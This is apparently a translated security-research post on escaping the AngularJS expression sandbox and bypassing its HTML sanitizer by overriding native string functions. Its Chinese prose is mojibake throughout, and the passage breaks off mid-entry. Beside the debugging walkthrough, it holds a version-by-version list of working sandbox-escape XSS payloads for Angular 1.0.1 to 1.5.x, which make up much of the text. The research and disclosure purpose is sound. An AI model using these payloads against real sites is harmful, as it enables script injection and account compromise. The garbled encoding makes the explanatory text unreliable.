æ‰§è¡Œã€‚è®©æˆ‘ä»¬å°è¯•è·å– Function æ„é€ å‡½æ•°ï¼š\nhttp://jsfiddle.net/2zs2yv7o/1/\nè¿™æ˜¯äº‹æƒ…å˜å¾—æ›´æœ‰è¶£çš„åœ°æ–¹ï¼Œè¿™æ˜¯é‡å†™çš„è¾“å‡ºï¼š\n&quot;use strict&quot;;var fn = function(s, l, a, i) &#123;  var v0, v1, v2, v3, v4 = l &amp;&amp; (&#x27;constructor&#x27; in l),    v5;  if (!(v4)) &#123;    if (s) &#123;      v3 = s.constructor;    &#125;  &#125; else &#123;    v3 = l.constructor;  &#125;  ensureSafeObject(v3, text);  if (v3 != null) &#123;    v2 = ensureSafeObject(v3.constructor, text);  &#125; else &#123;    v2 = undefined;  &#125;  if (v2 != null) &#123;    ensureSafeFunction(v2, text);    v5 = &#x27;alert\\u00281\\u0029&#x27;;    ensureSafeObject(v3, text);    v1 = ensureSafeObject(v3.constructor(ensureSafeObject(&#x27;alert\\u00281\\u0029&#x27;, text)), text);  &#125; else &#123;    v1 = undefined;  &#125;  if (v1 != null) &#123;    ensureSafeFunction(v1, text);    v0 = ensureSafeObject(v1(), text);  &#125; else &#123;    v0 = undefined;  &#125;  return v0;&#125;;return fn;\n\nå¦‚æ‚¨æ‰€è§ï¼ŒAngular ä¾æ¬¡éå†æ¯ä¸ªå¯¹è±¡å¹¶ä½¿ç”¨ ensureSafeObject å‡½æ•°å¯¹å…¶è¿›è¡Œæ£€æŸ¥ã€‚ensureSafeObjectå‡½æ•°æ£€æŸ¥å¯¹è±¡æ˜¯ Function æ„é€ å‡½æ•°ã€çª—å£å¯¹è±¡ã€DOM å…ƒç´ è¿˜æ˜¯ Object æ„é€ å‡½æ•°ã€‚å¦‚æœä»»ä½•æ£€æŸ¥ä¸ºçœŸï¼Œå®ƒå°†å¼•å‘å¼‚å¸¸å¹¶åœæ­¢æ‰§è¡Œè¡¨è¾¾å¼ã€‚å®ƒè¿˜é€šè¿‡ä½¿å¯¹å…¨å±€å˜é‡çš„æ‰€æœ‰å¼•ç”¨æ”¹ä¸ºæŸ¥çœ‹å¯¹è±¡å±æ€§æ¥é˜²æ­¢è®¿é—®å…¨å±€å˜é‡ã€‚\nAngular è¿˜æœ‰ä¸€äº›å…¶ä»–åŠŸèƒ½å¯ä»¥è¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼Œä¾‹å¦‚ensureSafeMemberNameå’ŒensureSafeFunctionã€‚ensureSafeMemberName æ£€æŸ¥ JavaScript å±æ€§å¹¶ç¡®ä¿å®ƒä¸ proto ç­‰ä¸åŒ¹é…ï¼Œå¹¶ä¸” ensureSafeFunction æ£€æŸ¥å‡½æ•°è°ƒç”¨ä¸è°ƒç”¨ Function æ„é€ å‡½æ•°æˆ–è°ƒç”¨ã€åº”ç”¨å’Œç»‘å®šã€‚\nç ´åæ¶ˆæ¯’å‰‚Angular sanitizer æ˜¯ç”¨ JavaScript ç¼–å†™çš„å®¢æˆ·ç«¯è¿‡æ»¤å™¨ï¼Œå®ƒæ‰©å±•äº† Angular ä»¥å®‰å…¨åœ°å…è®¸ä½¿ç”¨åä¸º ng-bind-html çš„å±æ€§è¿›è¡Œ HTML ç»‘å®šï¼Œå…¶ä¸­åŒ…å«è¦è¿‡æ»¤çš„å¼•ç”¨ã€‚ç„¶åå®ƒæ¥å—è¾“å…¥å¹¶å°†å…¶å‘ˆç°åœ¨ä¸å¯è§çš„ DOM æ ‘ä¸­ï¼Œå¹¶å¯¹å…ƒç´ å’Œå±æ€§åº”ç”¨ç™½åå•è¿‡æ»¤ã€‚\nåœ¨æµ‹è¯•Angular sanitizeræ—¶ï¼Œæˆ‘è€ƒè™‘è¿‡ä½¿ç”¨ Angular è¡¨è¾¾å¼è¦†ç›–åŸç”Ÿ JavaScript å‡½æ•°ã€‚é—®é¢˜æ˜¯ Angular è¡¨è¾¾å¼ä¸æ”¯æŒå‡½æ•°è¯­å¥æˆ–å‡½æ•°è¡¨è¾¾å¼ï¼Œå› æ­¤æ‚¨å°†æ— æ³•ç”¨ä»»ä½•å€¼è¦†ç›–å‡½æ•°ã€‚è€ƒè™‘äº†ä¸€ä¼šå„¿ï¼Œæˆ‘æƒ³åˆ°äº† String.fromCharCodeã€‚å› ä¸ºè¯¥å‡½æ•°æ˜¯ä» String æ„é€ å‡½æ•°è°ƒç”¨çš„ï¼Œè€Œä¸æ˜¯é€šè¿‡å­—ç¬¦ä¸²æ–‡å­—ï¼Œæ‰€ä»¥â€œthisâ€å€¼å°†æ˜¯ String æ„é€ å‡½æ•°ã€‚ä¹Ÿè®¸æˆ‘å¯ä»¥åé—¨ fromCharCode å‡½æ•°ï¼\nå¦‚ä½•åœ¨æ— æ³•åˆ›å»ºå‡½æ•°çš„æƒ…å†µä¸‹å¯¹ fromCharCode å‡½æ•°è¿›è¡Œåé—¨ï¼Ÿç®€å•ï¼šé‡ç”¨ç°æœ‰åŠŸèƒ½ï¼é—®é¢˜æ˜¯å¦‚ä½•åœ¨æ¯æ¬¡è°ƒç”¨ fromCharCode æ—¶æ§åˆ¶è¯¥å€¼ã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨ Array è¿æ¥å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ String æ„é€ å‡½æ•°æˆä¸ºä¸€ä¸ªå‡æ•°ç»„ã€‚æˆ‘ä»¬æ‰€éœ€è¦çš„åªæ˜¯ä¸€ä¸ªé•¿åº¦å±æ€§å’Œä¸€ä¸ª 0 å±æ€§ï¼Œç”¨äºæˆ‘ä»¬çš„å‡æ•°ç»„çš„ç¬¬ä¸€ä¸ªç´¢å¼•ï¼Œå¹¸è¿çš„æ˜¯å®ƒå·²ç»æœ‰ä¸€ä¸ªé•¿åº¦å±æ€§ï¼Œå› ä¸ºå®ƒçš„å‚æ•°é•¿åº¦æ˜¯ 1ã€‚æˆ‘ä»¬åªéœ€è¦ç»™å®ƒä¸€ä¸ª 0 å±æ€§ã€‚è¿™æ˜¯å¦‚ä½•åšåˆ°çš„ï¼š\n\nå½“è°ƒç”¨ String.fromCharCode æ—¶ï¼Œæ‚¨æ¯æ¬¡éƒ½ä¼šå¾—åˆ°å­—ç¬¦ä¸² &lt;iframe onload=alert(/Backdoored/)&gt; è€Œä¸æ˜¯æ‰€éœ€çš„å€¼ã€‚è¿™åœ¨ Angular æ²™ç®±ä¸­å®Œç¾è¿è¡Œã€‚è¿™æ˜¯ä¸€ä¸ªå°æç´ï¼š\nhttp://jsfiddle.net/2zs2yv7o/2/\næˆ‘ç»§ç»­æŸ¥çœ‹ Angular sanitizer çš„ä»£ç ï¼Œä½†æˆ‘æ‰¾ä¸åˆ°ä»»ä½•ä¼šå¯¼è‡´ç»•è¿‡çš„å¯¹ String.fromCharcode çš„è°ƒç”¨ã€‚æˆ‘æŸ¥çœ‹äº†å…¶ä»–åŸç”Ÿå‡½æ•°ï¼Œå‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„å‡½æ•°ï¼šcharCodeAtã€‚å¦‚æœæˆ‘å¯ä»¥è¦†ç›–è¿™ä¸ªå€¼ï¼Œé‚£ä¹ˆå®ƒå°†è¢«æ³¨å…¥åˆ°ä¸€ä¸ªå±æ€§ä¸­è€Œæ— éœ€ä»»ä½•è¿‡æ»¤ã€‚ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼šè¿™æ¬¡â€œthisâ€å€¼å°†æ˜¯å­—ç¬¦ä¸²æ–‡å­—ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²æ„é€ å‡½æ•°ã€‚è¿™æ„å‘³ç€æˆ‘ä¸èƒ½ä½¿ç”¨ç›¸åŒçš„æŠ€æœ¯æ¥è¦†ç›–è¯¥å‡½æ•°ï¼Œå› ä¸ºæˆ‘å°†æ— æ³•æ“ä½œç´¢å¼•æˆ–é•¿åº¦ï¼Œå› ä¸ºè¿™å¯¹äºå­—ç¬¦ä¸²æ–‡å­—æ˜¯ä¸å¯å†™çš„ã€‚\nç„¶åæˆ‘æƒ³åˆ°äº†ä½¿ç”¨ [].concat; ä½¿ç”¨æ­¤å‡½æ•°å°†æŒ‰åŸæ ·è¿”å›å­—ç¬¦ä¸²å’Œè¿æ¥åœ¨ä¸€èµ·çš„å‚æ•°ã€‚ä¸‹é¢çš„å°æç´è°ƒç”¨â€™abcâ€™.charCodeAt(0)ï¼Œæ‰€ä»¥ä½ ä¼šæœŸæœ›è¾“å‡ºæ˜¯â€™97â€™ï¼ˆascii aï¼‰ï¼Œä½†ç”±äºåé—¨ï¼Œå®ƒåè€Œè¿”å›åŸºæœ¬å­—ç¬¦ä¸²åŠ ä¸Šå‚æ•°ã€‚\nhttp://jsfiddle.net/2zs2yv7o/3/\nç„¶åè¿™ç ´åäº†æ¶ˆæ¯’å‰‚ï¼Œå› ä¸ºæˆ‘å¯ä»¥æ³¨å…¥é‚ªæ¶çš„å±æ€§ã€‚æ¶ˆæ¯’å‰‚ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š\nif (validAttrs[lkey] === true &amp;&amp; (uriAttrs[lkey] !== true || uriValidator(value, isImage))) &#123;  out(&#x27; &#x27;);  out(key);  out(&#x27;=&quot;&#x27;);  out(encodeEntities(value));  out(&#x27;&quot;&#x27;);&#125; \n\nOut å°†è¿”å›è¿‡æ»¤åçš„è¾“å‡ºï¼›key æŒ‡çš„æ˜¯å±æ€§åï¼›value æ˜¯å±æ€§å€¼ã€‚è¿™æ˜¯ encodeEntities å‡½æ•°ï¼š\nfunction encodeEntities(value) &#123; return value.  replace(/&amp;/g, &#x27;&amp;&#x27;).  replace(SURROGATE_PAIR_REGEXP, function(value) &#123;   var hi = value.charCodeAt(0);   var low = value.charCodeAt(1);   return &#x27;&amp;#&#x27; + (((hi - 0xD800) * 0x400) + (low - 0xDC00) + 0x10000) + &#x27;;&#x27;;  &#125;).  replace(NON_ALPHANUMERIC_REGEXP, function(value) &#123;   return &#x27;&amp;#&#x27; + value.charCodeAt(0) + &#x27;;&#x27;;  &#125;).  replace(/&lt;/g, &#x27;&lt;&#x27;).  replace(/&gt;/g, &#x27;&gt;&#x27;);&#125; \n\nç²—ä½“ä»£ç æ˜¯å‘ç”Ÿæ³¨å…¥çš„åœ°æ–¹ï¼Œå› æ­¤å¼€å‘äººå‘˜æ˜¾ç„¶å¸Œæœ› charCodeAt å‡½æ•°è¿”å›ä¸€ä¸ª intã€‚æ‚¨å¯ä»¥é˜²å¾¡æ€§åœ°ç¼–ç å¹¶å°†å€¼å¼ºåˆ¶ä¸º intï¼Œä½†å¦‚æœæ”»å‡»è€…å¯ä»¥è¦†ç›–æœ¬æœºå‡½æ•°ï¼Œæ‚¨å¯èƒ½å·²ç»æ‹¥æœ‰ã€‚è¿™ç»•è¿‡äº†æ¶ˆæ¯’å‰‚ï¼Œå¹¶ä½¿ç”¨ç±»ä¼¼çš„æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥çªç ´æ²™ç®±ã€‚\né€ƒç¦»æ²™ç®±æˆ‘æŸ¥çœ‹äº†æŸ¥æ‰¾ String.fromCharCode è°ƒç”¨çš„ Angular æºä»£ç ï¼Œå‘ç°äº†ä¸€ä¸ªéå¸¸æœ‰è¶£çš„å®ä¾‹ã€‚åœ¨è§£æå­—ç¬¦ä¸²æ–‡å­—æ—¶ï¼Œä»–ä»¬ä½¿ç”¨å®ƒæ¥è¾“å‡ºå€¼ã€‚æˆ‘æƒ³æˆ‘å¯ä»¥åé—¨ fromCharCode å¹¶ç ´è§£å·²è§£æçš„å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªå°æç´ï¼š\nhttp://jsfiddle.net/2zs2yv7o/4/\nåŸæ¥æˆ‘å¯ä»¥åé—¨ unicode è½¬ä¹‰ä½†ä¸èƒ½æ‰“ç ´é‡å†™çš„ä»£ç ã€‚\nç„¶åæˆ‘æƒ³çŸ¥é“æˆ‘ä»¥å‰åœ¨æ¶ˆæ¯’å‰‚ä¸Šä½¿ç”¨çš„ç›¸åŒæŠ€æœ¯æ˜¯å¦å¯ä»¥åœ¨è¿™é‡Œä¸ä¸åŒçš„æœ¬æœºåŠŸèƒ½ä¸€èµ·ä½¿ç”¨ã€‚æˆ‘è®¤ä¸ºä½¿ç”¨ charAt å¯ä»¥æˆåŠŸè§£æä»£ç ï¼Œä½†è¿”å›å®Œå…¨ä¸åŒçš„è¾“å‡ºå¹¶ç»•è¿‡æ²™ç®±ã€‚æˆ‘å°è¯•æ³¨å…¥å®ƒå¹¶æ£€æŸ¥é‡å†™çš„è¾“å‡ºã€‚\n&#123;&#123;  &#x27;a&#x27;.constructor.prototype.charAt=[].join;  $eval(&#x27;x=&quot;&quot;&#x27;)+&#x27;&#x27;&#125;&#125; \n\nhttp://jsfiddle.net/2zs2yv7o/5/\næ§åˆ¶å°æœ‰ä¸€äº›æœ‰è¶£çš„ç»“æœï¼Œæˆ‘ä»æµè§ˆå™¨è€Œä¸æ˜¯ Angular æ”¶åˆ° JavaScript è§£æé”™è¯¯ã€‚æˆ‘æŸ¥çœ‹äº†é‡å†™çš„ä»£ç ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n&quot;use strict&quot;;var fn = function(s, l, a, i) &#123;  var v5, v6 = l &amp;&amp; (&#x27;x\\u003d\\u0022\\u0022&#x27; in l);  if (!(v6)) &#123;    if (s) &#123;      v5 = s.x = &quot;&quot;;    &#125;  &#125; else &#123;    v5 = l.x = &quot;&quot;;  &#125;  return v5;&#125;;fn.assign = function(s, v, l) &#123;  var v0, v1, v2, v3, v4 = l &amp;&amp; (&#x27;x\\u003d\\u0022\\u0022&#x27; in l);  v3 = v4 ? l : s;  if (!(v4)) &#123;    if (s) &#123;      v2 = s.x = &quot;&quot;;    &#125;  &#125; else &#123;    v2 = l.x = &quot;&quot;;  &#125;  if (v3 != null) &#123;    v1 = v;    ensureSafeObject(v3.x = &quot;&quot;, text);    v0 = v3.x = &quot;&quot; = v1;  &#125;  return v0;&#125;;return fn; \n\nè¯­æ³•é”™è¯¯åœ¨ä¸Šé¢ä»¥ç²—ä½“æ˜¾ç¤ºï¼Œå¦‚æœé‡å†™çš„ä»£ç æ­£åœ¨ç”Ÿæˆ JavaScript è¯­æ³•é”™è¯¯ï¼Œè¿™æ„å‘³ç€æˆ‘å¯ä»¥åœ¨é‡å†™çš„è¾“å‡ºä¸­æ³¨å…¥æˆ‘è‡ªå·±çš„ä»£ç ï¼æ¥ä¸‹æ¥æˆ‘æ³¨å…¥äº†ä»¥ä¸‹ä»£ç ï¼š\n&#123;&#123;  &#x27;a&#x27;.constructor.prototype.charAt=[].join;  $eval(&#x27;x=alert(1)&#x27;)+&#x27;&#x27;&#125;&#125; \n\nè°ƒè¯•å™¨åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶åœæ­¢ï¼Œæˆ‘ç‚¹å‡»æ¢å¤ï¼Œç„¶åæˆ‘è„¸ä¸Šå¸¦ç€ç¿çƒ‚çš„ç¬‘å®¹å»åƒåˆé¥­ï¼Œå› ä¸ºç”šè‡³æ²¡æœ‰æ£€æŸ¥æˆ‘å°±çŸ¥é“æˆ‘æ‹¥æœ‰æ²™ç›’å¹¶ä¸”å¯èƒ½å‡ ä¹æ¯ä¸ªç‰ˆæœ¬éƒ½æ‹¥æœ‰ã€‚æˆ‘åƒå®Œåˆé¥­å›æ¥ï¼Œç‚¹å‡»æ¢å¤ï¼Œæœç„¶æˆ‘æ”¶åˆ°äº†è­¦æŠ¥å¹¶æ‰“ç ´äº†æ²™ç›’ã€‚è¿™æ˜¯å°æç´ï¼š\nhttp://jsfiddle.net/2zs2yv7o/6/\nè¿™æ˜¯é‡å†™çš„ä»£ç ï¼š\n&quot;use strict&quot;;var fn = function(s, l, a, i) &#123;  var v5, v6 = l &amp;&amp; (&#x27;x\\u003dalert\\u00281\\u0029&#x27; in l);  if (!(v6)) &#123;    if (s) &#123;      v5 = s.x = alert(1);    &#125;  &#125; else &#123;    v5 = l.x = alert(1);  &#125;  return v5;&#125;;fn.assign = function(s, v, l) &#123;  var v0, v1, v2, v3, v4 = l &amp;&amp; (&#x27;x\\u003dalert\\u00281\\u0029&#x27; in l);  v3 = v4 ? l : s;  if (!(v4)) &#123;    if (s) &#123;      v2 = s.x = alert(1);    &#125;  &#125; else &#123;    v2 = l.x = alert(1);  &#125;  if (v3 != null) &#123;    v1 = v;    ensureSafeObject(v3.x = alert(1), text);    v0 = v3.x = alert(1) = v1;  &#125;  return v0;&#125;;return fn; \n\nå¦‚æ‚¨æ‰€è§ï¼Œé‡å†™çš„ä»£ç åŒ…å«è­¦æŠ¥ã€‚æ‚¨å¯èƒ½ä¼šæ³¨æ„åˆ°è¿™åœ¨ Firefox ä¸Šä¸èµ·ä½œç”¨ã€‚è¿™æ˜¯ç»™ä½ çš„ä¸€ä¸ªå°æŒ‘æˆ˜ï¼Œè¯•ç€è®©å®ƒåœ¨ Firefox å’Œ Chrome ä¸Šè¿è¡Œã€‚é€‰æ‹©ä¸‹é¢çš„éšè—æ–‡æœ¬ä»¥è·å¾—æŒ‘æˆ˜çš„è§£å†³æ–¹æ¡ˆï¼š\n&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;);&#125;&#125;\n\nè¦æ·±å…¥æŸ¥çœ‹ Angular è§£æä»£ç æ—¶å‘ç”Ÿçš„æƒ…å†µï¼Œè¯·åœ¨ angular.js çš„ç¬¬ 14079 è¡Œæ”¾ç½®ä¸€ä¸ªæ–­ç‚¹ï¼ŒæŒ‰ä¸€æ¬¡ resume ä»¥è·³è¿‡åˆå§‹è§£æå¹¶é€šè¿‡åœ¨è°ƒè¯•å™¨ä¸­ä¸æ–­å•å‡» step into function æ¥é€æ­¥æ‰§è¡Œä»£ç ã€‚åœ¨è¿™é‡Œï¼Œæ‚¨å°†èƒ½å¤Ÿçœ‹åˆ° Angular é”™è¯¯åœ°è§£æä»£ç ã€‚å®ƒä¼šè®¤ä¸º x=alert(1) æ˜¯ç¬¬ 12699 è¡Œçš„æ ‡è¯†ç¬¦ã€‚ä»£ç å‡å®šå®ƒæ­£åœ¨æ£€æŸ¥ä¸€ä¸ªå­—ç¬¦ï¼Œä½†å®é™…ä¸Šå®ƒæ­£åœ¨æ£€æŸ¥ä¸€ä¸ªæ›´é•¿çš„å­—ç¬¦ä¸²ï¼Œå› æ­¤å®ƒé€šè¿‡äº†æµ‹è¯•ã€‚è§ä¸‹æ–‡ï¼š\nisIdent= function(ch) &#123;  return (&#x27;a&#x27; &lt;= ch &amp;&amp; ch &lt;= &#x27;z&#x27; ||      &#x27;A&#x27; &lt;= ch &amp;&amp; ch &lt;= &#x27;Z&#x27; ||      &#x27;_&#x27; === ch || ch === &#x27;$&#x27;); &#125;isIdent(&#x27;x9=9a9l9e9r9t9(919)&#x27;)\n\nè¯¥å­—ç¬¦ä¸²æ˜¯ä½¿ç”¨æˆ‘ä»¬è¦†ç›–çš„ charAt å‡½æ•°ç”Ÿæˆçš„ï¼Œè€Œ 9 æ˜¯ä¼ é€’çš„å‚æ•°ã€‚ç”±äºä»£ç çš„ç¼–å†™æ–¹å¼ï¼Œå®ƒæ€»æ˜¯ä¼šé€šè¿‡æµ‹è¯•ï¼Œå› ä¸ºâ€œaâ€ã€â€œzâ€ç­‰æ€»æ˜¯å°äºè¾ƒé•¿çš„å­—ç¬¦ä¸²ã€‚å¹¸è¿çš„æ˜¯ï¼Œåœ¨ç¬¬ 12701 è¡Œï¼ŒåŸå§‹å­—ç¬¦ä¸²ç”¨äºåˆ¶ä½œæ ‡è¯†ç¬¦ã€‚ç„¶ååœ¨ç¬¬ 13247 è¡Œï¼Œå½“åˆ›å»ºèµ‹å€¼å‡½æ•°æ—¶ï¼Œæ ‡è¯†ç¬¦å°†å¤šæ¬¡æ³¨å…¥å‡½æ•°å­—ç¬¦ä¸²ï¼Œå½“ä½¿ç”¨ Function æ„é€ å‡½æ•°è°ƒç”¨æ—¶ï¼Œå®ƒä¼šæ³¨å…¥æˆ‘ä»¬çš„è­¦æŠ¥ã€‚\nè¿™æ˜¯é’ˆå¯¹ Angular 1.4 é‡èº«å®šåˆ¶çš„æœ€ç»ˆæœ‰æ•ˆè½½è·ï¼š\n&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;eval(&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;);&#125;&#125;\n\nç»“è®ºå¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯ Angularï¼Œæ‚¨éœ€è¦å°†ç”¨æˆ·è¾“å…¥ä¸­çš„èŠ±æ‹¬å·è§†ä¸ºé«˜åº¦å±é™©ï¼Œæˆ–è€…å®Œå…¨é¿å…æœåŠ¡å™¨ç«¯åå°„ç”¨æˆ·è¾“å…¥ã€‚å¤§å¤šæ•°å…¶ä»– JavaScript æ¡†æ¶é€šè¿‡ä¸æ”¯æŒ HTML æ–‡æ¡£ä¸­ä»»æ„ä½ç½®çš„è¡¨è¾¾å¼æ¥å›é¿è¿™ç§å±é™©ã€‚\nGoogle è‚¯å®šçŸ¥é“è¿™ä¸ªé—®é¢˜ï¼Œä½†æˆ‘ä»¬ä¸ç¡®å®šå®ƒåœ¨æ›´å¹¿æ³›çš„ç¤¾åŒºä¸­çš„çŸ¥ååº¦ï¼Œå°½ç®¡å·²æœ‰å…³äºè¯¥ä¸»é¢˜çš„ç ”ç©¶ã€‚Angular çš„æ–‡æ¡£ç¡®å®å»ºè®®ä¸è¦åœ¨æ¨¡æ¿ä¸­åŠ¨æ€åµŒå…¥ç”¨æˆ·è¾“å…¥ï¼Œä½†ä¹Ÿè¯¯å¯¼æ€§åœ°æš—ç¤º Angular ä¸ä¼šå°†ä»»ä½• XSS æ¼æ´å¼•å…¥å…¶ä»–å®‰å…¨ä»£ç ä¸­ã€‚è¿™ä¸ªé—®é¢˜ç”šè‡³ä¸ä»…é™äºå®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥ï¼›Angular æ¨¡æ¿æ³¨å…¥å¯ä»¥ï¼ˆå¹¶ä¸”å·²ç»ï¼‰åœ¨æœåŠ¡å™¨ç«¯æ˜¾ç¤ºå¹¶å¯¼è‡´ RCEã€‚\næˆ‘è®¤ä¸ºè¿™ä¸ªé—®é¢˜åˆ°ç›®å‰ä¸ºæ­¢åªæ˜¯å› ä¸ºç¼ºä¹æœ€æ–°çš„ Angular åˆ†æ”¯çš„å·²çŸ¥æ²™ç®±é€ƒé€¸è€Œå¼•èµ·äº†æ›´å¹¿æ³›çš„å…³æ³¨ã€‚æ‰€ä»¥ç°åœ¨å¯èƒ½æ˜¯è€ƒè™‘ä¸º JavaScript å¯¼å…¥åˆ¶å®šè¡¥ä¸ç®¡ç†ç­–ç•¥çš„å¥½æ—¶æœºã€‚\nè¿™ä¸ªæ²™ç›’é€ƒé€¸äº‹ä»¶äº 2015 å¹´ 9 æœˆ 25 æ—¥ç§ä¸‹æŠ¥å‘Šç»™ Googleï¼Œå¹¶äº 2016 å¹´ 1 æœˆ 15 æ—¥åœ¨ 1.5.0 ç‰ˆä¸­è¿›è¡Œäº†ä¿®è¡¥ã€‚é‰´äº AngularJS æ²™ç›’ç»•è¿‡çš„æ‚ ä¹…å†å²ï¼Œä»¥åŠ Angular åšæŒæ²™ç›’â€œå¹¶éæ—¨åœ¨é˜»æ­¢æ”»å‡»è€…â€ ï¼Œæˆ‘ä»¬ä¸è®¤ä¸ºæ›´æ–° Angular æ˜¯è¡¨è¾¾å¼æ³¨å…¥çš„å¯é è§£å†³æ–¹æ¡ˆã€‚å› æ­¤ï¼Œæˆ‘ä»¬å‘å¸ƒäº†æ–°çš„Burp Scanneræ£€æŸ¥æ¥æ£€æµ‹å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œå¹¶åœ¨ä¸‹é¢åŒ…å«äº†æœ€æ–°çš„ Angular æ²™ç®±é€ƒé€¸åˆ—è¡¨ã€‚\næ›´æ–°â€¦æˆ‘ä»¬åœ¨è¿™ç¯‡åšæ–‡ä¸­æä¾›äº†çœŸå®ä¸–ç•Œåº”ç”¨ç¨‹åºä¸­çš„æ²™ç›’é€ƒé€¸ç¤ºä¾‹ã€‚æˆ‘ä»¬è¿˜å‘å¸ƒäº†åŸºäº DOM çš„ AngularJS æ²™ç®±é€ƒé€¸ã€‚\næ›´æ–°â€¦ä» 1.6 ç‰ˆå¼€å§‹ï¼ŒAngular å·²ç»å®Œå…¨ç§»é™¤äº†æ²™ç®±\næ²™ç›’é€ƒè„±æˆ‘ä»¬æ­£åœ¨ç§¯æç»´æŠ¤XSS å¤‡å¿˜å•ä¸Šçš„æ²™ç›’é€ƒé€¸åˆ—è¡¨ï¼š\n\nåå°„çš„ AngularJS æ²™ç®±é€ƒé€¸\nåŸºäº DOM çš„ AngularJS æ²™ç®±é€ƒé€¸\nAngularJS CSP ç»•è¿‡\n\næ²™ç›’ç»•è¿‡åˆ—è¡¨1.0.1 - 1.1.5\né©¬é‡Œå¥¥Â·æµ·å¾·é‡Œå¸Œ (Cure53)\n&#123;&#123;constructor.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;\n\n1.2.0 - 1.2.1\næ‰¬Â·éœæ© ï¼ˆè°·æ­Œï¼‰\n&#123;&#123;a=&#x27;constructor&#x27;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&#x27;alert(1)&#x27;)()&#125;&#125;\n\n1.2.2 - 1.2.5\nåŠ é›·æ–¯Â·æµ·è€¶æ–¯ ï¼ˆPortSwiggerï¼‰\n&#123;&#123;&#x27;a&#x27;[&#123;toString:[].join,length:1,0:&#x27;__proto__&#x27;&#125;].charAt=&#x27;&#x27;.valueOf;$eval(&quot;x=&#x27;&quot;+(y=&#x27;if(!window\\\\u002ex)alert(window\\\\u002ex=1)&#x27;)+eval(y)+&quot;&#x27;&quot;);&#125;&#125;\n\n1.2.6 - 1.2.18\næ‰¬Â·éœæ© ï¼ˆè°·æ­Œï¼‰\n&#123;&#123;(_=&#x27;&#x27;.sub).call.call(&#123;&#125;[$=&#x27;constructor&#x27;].getOwnPropertyDescriptor(_.__proto__,$).value,0,&#x27;alert(1)&#x27;)()&#125;&#125;\n\n1.2.19 - 1.2.23\né©¬è’‚äºšæ–¯Â·å¡å°”æ¾\n&#123;&#123;toString.constructor.prototype.toString=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(toString.constructor);&#125;&#125;\n\n1.2.24 - 1.2.29\nåŠ é›·æ–¯Â·æµ·è€¶æ–¯ ï¼ˆPortSwiggerï¼‰\n&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=&#x27;&#x27;.valueOf;$eval(&quot;x=&#x27;\\&quot;+(y=&#x27;if(!window\\\\u002ex)alert(window\\\\u002ex=1)&#x27;)+eval(y)+\\&quot;&#x27;&quot;);&#125;&#125;\n\n1.3.0\nåŠ åšå°”Â·è«çº³å°” ï¼ˆè°·æ­Œï¼‰\n&#123;&#123;!ready &amp;&amp; (ready = true) &amp;&amp; (      !call      ? $$watchers[0].get(toString.constructor.prototype)      : (a = apply) &amp;&amp;        (apply = constructor) &amp;&amp;        (valueOf = call) &amp;&amp;        (&#x27;&#x27;+&#x27;&#x27;.toString(          &#x27;F = Function.prototype;&#x27; +          &#x27;F.apply = F.a;&#x27; +          &#x27;delete F.a;&#x27; +          &#x27;delete F.valueOf;&#x27; +          &#x27;alert(1);&#x27;        ))    );&#125;&#125;\n\n1.3.1 - 1.3.2\nåŠ é›·æ–¯Â·æµ·è€¶æ–¯ ï¼ˆPortSwiggerï¼‰\n&#123;&#123;    &#123;&#125;[&#123;toString:[].join,length:1,0:&#x27;__proto__&#x27;&#125;].assign=[].join;    &#x27;a&#x27;.constructor.prototype.charAt=&#x27;&#x27;.valueOf;     $eval(&#x27;x=alert(1)//&#x27;); &#125;&#125;\n\n1.3.3 - 1.3.18\nåŠ é›·æ–¯Â·æµ·è€¶æ–¯ ï¼ˆPortSwiggerï¼‰\n&#123;&#123;&#123;&#125;[&#123;toString:[].join,length:1,0:&#x27;__proto__&#x27;&#125;].assign=[].join;   &#x27;a&#x27;.constructor.prototype.charAt=[].join;  $eval(&#x27;x=alert(1)//&#x27;);  &#125;&#125;\n\n1.3.19\nåŠ é›·æ–¯Â·æµ·è€¶æ–¯ ï¼ˆPortSwiggerï¼‰\n&#123;&#123;    &#x27;a&#x27;[&#123;toString:false,valueOf:[].join,length:1,0:&#x27;__proto__&#x27;&#125;].charAt=[].join;     $eval(&#x27;x=alert(1)//&#x27;); &#125;&#125;\n\n1.3.20\nåŠ é›·æ–¯Â·æµ·è€¶æ–¯ ï¼ˆPortSwiggerï¼‰\n&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=alert(1)&#x27;);&#125;&#125;\n\n1.4.0 - 1.4.9\nåŠ é›·æ–¯Â·æµ·è€¶æ–¯ ï¼ˆPortSwiggerï¼‰\n&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;);&#125;&#125;\n\n1.5.0 - 1.5.8\nä¼Šæ©Â·å¸ŒåŸº\n&#123;&#123;x = &#123;&#x27;y&#x27;:&#x27;&#x27;.constructor.prototype&#125;; x[&#x27;y&#x27;].charAt=[].join;$eval(&#x27;x=alert(1)&#x27;);&#125;&#125; \n\n1.5.9 - 1.5.11\næ‰¬Â·éœæ© ï¼ˆè°·æ­Œï¼‰\n&#123;&#123;   